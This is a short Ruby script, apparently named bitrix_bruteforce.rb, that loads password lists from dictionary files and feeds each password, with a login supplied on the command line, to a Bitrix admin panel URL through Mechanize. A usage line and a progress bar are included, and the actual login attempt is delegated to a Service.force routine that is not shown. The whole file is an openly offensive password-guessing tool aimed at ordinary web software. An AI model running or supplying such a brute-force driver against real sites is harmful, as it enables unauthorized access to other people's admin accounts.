#!/usr/bin/env ruby

require './lib/service.rb'

begin  
  passes = []
  files = []

  Dir["dictionaries/**.txt"].each do |file|
    puts file
    File.open(file, "r") do |f|
      while line = f.gets
        passes << line.chomp.chomp
      end
    end

    # let's try to parse!
    begin
      agent = Mechanize.new
      agent.get(ARGV[1])
    rescue ArgumentError, SocketError => e
      puts "Something wrong, use right url!"
      puts "Usage: ./bitrix_bruteforce.rb some_login http://example.com/path/to/admin/panel"
      exit
    end

    # progress bar initialization
    bar = ProgressBar.new(passes.length)

    passes.each_with_index do |pass, index|
      bar.increment!
      Service.force(agent, ARGV[0], pass)
    end
  end
rescue SystemExit, Interrupt => e
  puts "\nProgress saved."
  exit
end